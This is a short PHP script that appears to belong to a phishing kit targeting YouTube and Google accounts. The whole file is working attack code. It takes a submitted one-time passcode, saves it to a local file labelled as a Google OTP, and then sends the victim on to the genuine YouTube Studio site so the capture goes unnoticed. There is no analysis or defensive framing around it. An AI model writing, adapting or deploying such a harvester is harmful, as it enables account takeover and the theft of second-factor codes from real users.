<?php
file_put_contents("otp.txt", "Youtube/Google OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://studio.youtube.com/');
?>
